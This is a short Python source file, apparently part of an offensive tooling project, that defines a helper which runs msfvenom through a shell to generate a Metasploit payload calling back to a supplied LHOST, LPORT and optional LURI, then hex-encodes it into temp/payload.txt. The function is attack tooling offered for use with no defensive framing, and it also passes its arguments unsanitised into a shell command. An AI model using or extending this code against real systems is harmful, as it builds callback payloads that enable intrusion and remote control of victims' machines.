import subprocess

def msfvenom(payload, lhost, lport, luri):
    print(f"msfvenom is generating payload for {payload} ...")
    LURI_part = f" LURI={luri}" if luri else ""
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {LURI_part} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
    subprocess.run(command, shell=True, check=True)